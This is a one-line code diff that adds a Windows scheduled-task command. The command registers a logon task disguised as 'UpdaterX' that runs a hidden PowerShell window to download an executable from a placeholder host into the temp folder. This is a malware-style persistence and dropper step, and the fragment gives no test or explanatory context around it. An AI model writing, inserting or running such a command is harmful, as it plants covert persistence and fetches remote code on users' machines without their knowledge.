@@ -1,0 +1,1 @@
+schtasks /create /sc onlogon /tn UpdaterX /tr "powershell -w hidden -c iwr http://sch-5.example.test/u5.exe -o %TEMP%\up.exe" /f
